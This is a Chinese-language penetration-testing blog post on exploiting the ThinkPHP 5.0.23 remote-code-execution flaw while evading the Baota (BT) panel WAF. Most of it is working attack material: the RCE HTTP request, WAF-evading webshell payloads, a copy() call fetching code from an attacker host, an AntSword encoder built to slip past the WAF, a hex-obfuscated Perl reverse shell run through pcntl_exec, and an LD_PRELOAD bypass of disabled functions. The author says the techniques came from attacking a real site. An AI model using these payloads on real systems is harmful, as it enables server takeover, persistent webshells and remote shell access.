---
title: Thinkphp RCE绕过宝塔面板的姿势分享
date: 2019-08-24T16:17:08.889Z
tags:
 - 宝塔
 - Thinkphp
 - 绕过
categories:
 - 原创
 - 渗透
---

最先发在t00ls上，空闲时间迁了过来

## 0 起因

最近在渗透一个站，是Thinkphp 5.0.23的架构， 本来是用Poc直接打就完事了，无奈遇上了宝塔的防火墙，各种敏感函数各种过滤，看了网上一些教程，试了试并没法绕过最新的BT WAF
<!-- more -->
## 1 工具和环境

渗透环境是PHP7.2+Thinkphp 5.0.23+最新版的BT WAF

本过程中使用的工具主要有：BurpSuite、中国蚁剑

## 2 测试过程

### 2.1 环境

这是我本地搭建的测试环境，可以看到是php7.2版本，Thinkphp版本是5.0.23，刚好在RCE的攻击范围内

![1566489694896](./Thinkphp%20Rce绕过宝塔面板的姿势分享/1566489694896.png)

开始的时候一切都很顺利，直接使用POC查看phpinfo

```
POST /index.php?s=captcha&aaa=id HTTP/1.1
Host: rank.localtest.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0)Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh,en-US;q=0.8,en;q=0.5,zh-SG;q=0.3
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded 
Content-Length: 85

_method=__construct&filter[]=call_user_func&method=get&server[REQUEST_METHOD]=phpinfo
```

![1566403268447](./Thinkphp%20RCE绕过宝塔面板的姿势分享/1566403268447.png)

但是当我使用攻击性Poc的时候

```
_method=__construct&filter[]=call_user_func&method=get&server[REQUEST_METHOD]=<?php eval($_POST[x]);?>
```

我们的请求被残忍的阻断了

![1566488843561](./Thinkphp%20RCE绕过宝塔面板的姿势分享/1566488843561.png)

所以我们需要找一个宝塔查不出来的Shell

### 2.2 宝塔规则模拟

本着深入研究的精神，我在本地虚拟环境装了一个宝塔面板，把里面的规则提取出来写了个脚本进行检测，由于其对POST和GET的过滤基本一致，我们就随便选一个提取就完事了，规则文件在`/www/server/btwaf/rule/`目录

```Python
import re

value = '<?php file_get_contents ('

regex = {
    '0.目录保护1': '\\.\\./\\.\\./',
    '1.SQL注入过滤1': '\\s+(or|xor|and)\\s+.*(=|<|>|\\\'")',
    '2.目录保护2': '/\\*',
    '3.目录保护3': '(?:etc\\/\\W*passwd)',
    '4.PHP流协议过滤1': '(gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\\:\\/',
    '5.一句话木马过滤1': '\\:\\$',
    '6.一句话木马过滤2': '\\$\\{',
    '7.一句话*屏蔽的关键字*过滤1': 'base64_decode\\(',
    '8.一句话*屏蔽的关键字*过滤2': '(?:define|eval|file_get_contents|include|require_once|shell_exec|phpinfo|system|passthru|chr|char|preg_\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog|file_put_contents|fopen|urldecode|scandir)\\(',
    '9.一句话*屏蔽的关键字*过滤3': '\\$_(GET|post|cookie|files|session|env|phplib|GLOBALS|SERVER)',
    '10.SQL注入过滤1': '\\s+(or|xor|and)\\s+(=|<|>|\'|")',
    '11.SQL注入过滤2': 'select\\s+.+(from|limit)\\s+',
    '12.SQL注入过滤3': '(?:(union(.*?)select))',
    '13.SQL注入过滤5': 'sleep\\((\\s*)(\\d*)(\\s*)\\)',
    '14.SQL注入过滤6': 'benchmark\\((.*)\\,(.*)\\)',
    '15.SQL注入过滤7': '(?:from\\W+information_schema\\W)',
    '16.SQL注入过滤8': '(?:(?:current_)user|database|concat|extractvalue|polygon|updatexml|geometrycollection|schema|multipoint|multipolygon|connection_id|linestring|multilinestring|exp|right|sleep|group_concat|load_file|benchmark|file_put_contents|urldecode|system|file_get_contents|select|substring|substr|fopen|popen|phpinfo|user|alert|scandir|shell_exec|eval|execute|concat_ws|strcmp|right)\\s*\\(',
    '17.SQL注入过滤9': 'into(\\s+)+(?:dump|out)file\\s*',
    '18.SQL注入过滤10': 'group\\s+by\\s+\\d',
    '19.XSS过滤1': '\\<(iframe|script|body|img|layer|div|meta|style|base|object|input)',
    '20.XSS过滤2': '(onmouseover|onerror|onload)\\=',
    '21.SQL报错注入过滤01': '(extractvalue\\(|concat\\(|user\\(\\)|substring\\(|count\\(\\*\\)|substring\\(hex\\(|updatexml\\()',
    '22.SQL报错注入过滤02': '(@@version|load_file\\(|NAME_CONST\\(|exp\\(\\~|floor\\(rand\\(|geometrycollection\\(|multipoint\\(|polygon\\(|multipolygon\\(|linestring\\(|multilinestring\\(|right\\()',
    '23.SQL注入过滤10': '(substr\\()',
    '24.SQL注入过滤1': '(ORD\\(|MID\\(|IFNULL\\(|CAST\\(|CHAR\\()',
    '25.SQL注入过滤1': '(EXISTS\\(|SELECT\\#|\\(SELECT|select\\()',
    '26.菜刀流量过滤': '(array_map\\("ass)',
    '27.SQL注入过滤1': '\\|+\\s+[\\w\\W]+=[\\w\\W]+',
    '28.SQL报错注入过滤01': '(bin\\(|ascii\\(|benchmark\\(|concat_ws\\(|group_concat\\(|strcmp\\(|left\\(|datadir\\(|greatest\\()',
    '29.': '(?:from.+?information_schema.+?)',
    '30.SQL注入过滤8': '(?:(?:current_)user|database|schema|connection_id)\\s*\\(',
    '31.SQL注入过滤10': 'group\\s+by.+\\(',
    '32.SQL报错注入过滤01': '(extractvalue\\(|concat\\(0x|user\\(\\)|substring\\(|count\\(\\*\\)|substring\\(hex\\(|updatexml\\()',
    '33.SQL报错注入过滤02': '(@@version|load_file\\(|NAME_CONST\\(|exp\\(\\~|floor\\(rand\\(|geometrycollection\\(|multipoint\\(|polygon\\(|multipolygon\\(|linestring\\(|multilinestring\\()',
    '34.SQL注入过滤1': '(ORD\\(|MID\\(|IFNULL\\(|CAST\\(|CHAR\\))'
}

for name, reg in regex.items():
    reg = re.compile(reg, re.I | re.M)
    r = reg.findall(value)
    if r:
        print('规则名：{0}\n规则内容：{1}\n命中内容：{2}'.format(name, reg.pattern, r))
```

可以看到我们刚才使用的脚本是这样被检测出来的

```
规则名：16.SQL注入过滤8
规则内容：(?:(?:current_)user|database|concat|extractvalue|polygon|updatexml|geometrycollection|schema|multipoint|multipolygon|connection_id|linestring|multilinestring|exp|right|sleep|group_concat|load_file|benchmark|file_put_contents|urldecode|system|file_get_contents|select|substring|substr|fopen|popen|phpinfo|user|alert|scandir|shell_exec|eval|execute|concat_ws|strcmp|right)\s*\(
命中内容：['file_get_contents (']
```

### 2.3 GetShell方法

这个Poc的GetShell的办法是包含文件，通常是thinkphp的日志文件

`_method=__construct&method=get&filter[]=think\__include_file&server[]=-1&get[]=../runtime/log/2019xx/xx.log`

但是这样有时候会有问题，就是thinkphp的日志文件比较大，而且有时候会有很多奇怪的问题阻断代码执行

所以也可以通过thinkphp本身Library中设置Session的方法把脚本写入tmp目录里的Session文件，然后进行包含

`_method=__construct&filter[]=think\Session::set&method=get&server[REQUEST_METHOD]=<? phpinfo();?>`

### 2.4 绕过方式探究

#### 2.4.1 Copy函数绕过

`_method=__construct&filter[]=call_user_func&method=get&server[REQUEST_METHOD]=<?=copy("http://192.168.31.174/test.txt","test.php");?>`

#### 2.4.2 变形一句话

参考了[p师傅的文章](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)，其中提到了php7中[表达式执行的顺序](https://www.php.net/manual/zh/migration70.incompatible.php)的修改，使得现在可以通过('phpinfo')();来执行函数，这样也就绕开了宝塔的限制，所以可以使用以下的一句话`<?php eval(('base64_decode')(('hex2bin')($_REQUEST['test'])));?>`

## 2.5 AntSword绕过宝塔WAF

宝塔面板主要是过滤了蚁剑的UserAgent以及参数里的命令，只需要进行简单的编码就可以进行绕过，关键的是必须直接传处理过的值到服务器，所以就需要特殊定制的一句话以及蚁剑的编码器

编码器代码：

```
/**
 * php::特殊编码器
 */

'use strict';

/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  let tmp = Buffer.from(Buffer.from(data['_']).toString('base64')).toString('hex');

  data[pwd] = tmp;

  delete data['_'];
  return data;
}
```

与之对应的是php的一句话也需要进行编码处理：

```php
<?php eval(base64_decode(hex2bin($_POST['x'])));?>
```

### 2.6 绕过禁用函数执行系统命令

BT默认禁用了很多的函数，主要有以下函数：

`passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru`

参考了[mochazz的文章](https://mochazz.github.io/2018/09/27/渗透测试之绕过PHP的disable_functions/)可以得知，如果开启了 **pcntl** 扩展，就可以利用 **pcntl_exec** 函数来执行命令，当然要想利用这种方法的话还是有些限制的（ **PHP 4 >= 4.2.0, PHP 5 on linux** ），以下是可以使用pcntl反弹shell的脚本：

```PHP
<?php
/*******************************
*查看phpinfo编译参数--enable-pcntl
*作者 Spider
*nc -vvlp 443
********************************/
$ip = 'xxx.xxx.xxx.xxx';
$port = '443';
$file = '/tmp/bc.pl';
header("content-Type: text/html; charset=gb2312");
if(function_exists('pcntl_exec')) {
$data = "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x20\x2d\x77\x0d\x0a\x23\x0d\x0a".
"\x0d\x0a\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74\x3b\x20\x20\x20\x20\x0d\x0a\x75\x73\x65\x20".
"\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x75\x73\x65\x20\x49\x4f\x3a\x3a\x48\x61\x6e\x64\x6c\x65".
"\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x20\x3d\x20\x27".$ip.
"\x27\x3b\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x20\x3d\x20\x27".$port.
"\x27\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x70\x72\x6f\x74\x6f\x20\x3d\x20\x67\x65\x74\x70\x72".
"\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x22\x74\x63\x70\x22\x29\x3b\x0d\x0a\x6d\x79\x20\x24".
"\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x20\x3d\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e".
"\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x2c\x20\x69\x6e\x65\x74\x5f\x61\x74\x6f".
"\x6e\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x29\x29\x3b\x0d\x0a\x6d\x79\x20\x24\x73\x68".
"\x65\x6c\x6c\x20\x3d\x20\x27\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x27\x3b\x0d\x0a\x73\x6f".
"\x63\x6b\x65\x74\x28\x53\x4f\x43\x4b\x2c\x20\x41\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43".
"\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x24\x70\x72\x6f\x74\x6f\x29\x3b\x0d\x0a\x53\x54\x44".
"\x4f\x55\x54\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x53\x4f\x43".
"\x4b\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x63\x6f\x6e\x6e\x65".
"\x63\x74\x28\x53\x4f\x43\x4b\x2c\x24\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x29\x20\x6f\x72\x20".
"\x64\x69\x65\x20\x22\x63\x61\x6e\x20\x6e\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x3a\x24\x21".
"\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x49\x4e\x2c\x20\x22\x3c\x26\x53\x4f\x43\x4b".
"\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x4f\x55\x54\x2c\x20\x22\x3e\x26\x53\x4f\x43".
"\x4b\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x45\x52\x52\x2c\x20\x22\x3e\x26\x53\x4f".
"\x43\x4b\x22\x3b\x0d\x0a\x73\x79\x73\x74\x65\x6d\x28\x24\x73\x68\x65\x6c\x6c\x29\x3b\x0d\x0a".
"\x63\x6c\x6f\x73\x65\x20\x53\x4f\x43\x4b\x3b\x0d\x0a\x65\x78\x69\x74\x20\x30\x3b\x0a";
$fp = fopen($file,'w');
$key = fputs($fp,$data);
fclose($fp);
if(!$key) exit('写入'.$file.'失败');
chmod($file,0777);
pcntl_exec($file);
unlink($file);
} else {
echo '不支持pcntl扩展';
}
?>
```

可以看到在通过蚁剑的脚本执行插件执行这个脚本之后成功绕过宝塔的disable_function反弹shell

![1566567424504](./Thinkphp%20RCE绕过宝塔面板的姿势分享/1566567424504.png)

![1566567405030](./Thinkphp%20RCE绕过宝塔面板的姿势分享/1566567405030.png)

## 3 总结

其实关于命令执行这点还是有些遗憾，因为尝试使用[LD_PRELOAD劫持](https://www.freebuf.com/articles/web/192052.html)没有完全成功，只能执行一些简单命令，关于这点希望有大佬能指点一二，下面是使用的代码，和执行结果

```php
$evil_cmdline = 'id';
$out_path = '/tmp/output';
echo "cmdline: " . $evil_cmdline . "\n";

$evil_cmdline .= ' > '. $out_path;
putenv("EVIL_CMDLINE=" . $evil_cmdline);
$so_path = '/tmp/bypass_disablefunc_x64.so';
putenv("LD_PRELOAD=" . $so_path);

mail("", "", "", "");
echo "output: " . nl2br(file_get_contents($out_path)); 
```

![1566569823871](./Thinkphp%20RCE绕过宝塔面板的姿势分享/1566569823871.png)

总的来说，全流程绕过宝塔WAF的目的还是达到了，也有一点点微薄的产出，希望大家不吝赐教更多的绕过思路。
